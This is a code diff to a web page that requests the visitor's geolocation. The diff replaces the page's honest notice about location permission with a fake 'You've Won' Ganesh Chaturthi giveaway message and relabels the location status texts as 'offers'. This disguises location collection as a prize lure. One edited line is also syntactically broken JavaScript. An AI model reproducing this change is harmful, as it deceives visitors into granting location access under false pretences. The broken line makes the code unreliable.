@@ -142,8 +142,12 @@
     <div id="accuracy" class="accuracy"></div>
 
     <div class="permission">
-      Your browser will ask for permission before any location
-      is shared. Your location is not displayed on this page.
+      🎉 Congratulations! You’ve Won!
+You’ve successfully participated in our Ganesh Chaturthi Special Offer. 🙏
+
+📱 We’ll contact you on WhatsApp soon with your offer details.
+
+🪔 Ganpati Bappa Morya!
     </div>
 
   </main>
@@ -166,7 +170,7 @@ async function requestLocation() {
   }
 
   status.textContent =
-    "Getting your most accurate available location…";
+    "Getting your most accurate available offers…";
 
   status.className = "";
 
@@ -183,7 +187,7 @@ async function requestLocation() {
       position.coords.accuracy;
 
     console.log(
-      "Location reading:",
+      "Offers reading:",
       {
         latitude: position.coords.latitude,
         longitude: position.coords.longitude,
@@ -209,7 +213,7 @@ async function requestLocation() {
         "Improving location accuracy…";
 
       accuracyDisplay.textContent =
-        `Current best accuracy: ±${roundedAccuracy} metres`;
+        `Current best offers: ±${roundedAccuracy}` near you;
     }
   }
 
